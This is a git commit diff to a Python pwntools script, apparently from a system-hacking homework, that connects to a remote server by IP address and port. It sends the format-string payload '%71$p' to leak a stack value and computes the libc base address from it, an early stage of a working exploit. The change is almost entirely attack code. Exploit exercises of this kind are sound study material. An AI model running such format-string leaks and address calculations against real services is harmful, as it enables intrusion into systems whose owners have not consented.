d1a1f2f6d2182123fa70e1e8208bb3c7211c7727
Brian <hibrian827@gmail.com>
2024-04-17 01:14:41 +0900

    got library address

--- WHS/main.py
+++ WHS/main.py
@@ -4,13 +4,17 @@ port = 5000
 rem = remote("52.79.50.147", port)
 
 elf = ELF("./WHS/system_hacking_hw/problem/libc.so.6")
-print(list(elf.search(b"main")))
+# print(elf.symbols[b"__libc_start_main"])
+# print(list(elf.search(b"main")))
+start_offset = 6496
 
-payload = b"hi"
+payload = b"%71$p"
 rem.sendlineafter(b"post?", payload)
 rem.recvuntil(b"post:\n")
-msg = rem.recvline()
-print(msg)
+ret_addr = int(rem.recv(14), 16) - 243
+lib_base = ret_addr - start_offset
+print(p64(ret_addr))
+print(p64(lib_base))
 
 payload = b"hi" 
 rem.sendlineafter(b"post?\n", payload)
